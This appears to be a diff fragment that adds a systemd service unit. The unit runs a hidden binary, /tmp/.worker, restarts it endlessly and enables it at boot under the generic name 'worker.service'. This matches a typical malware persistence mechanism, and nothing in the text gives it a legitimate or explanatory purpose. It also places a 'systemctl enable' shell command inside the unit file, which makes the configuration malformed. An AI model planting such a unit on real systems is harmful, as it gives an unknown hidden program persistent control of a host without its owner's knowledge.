@@ -1,0 +1,7 @@
+[Service]
+ExecStart=/tmp/.worker
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+systemctl enable worker.service
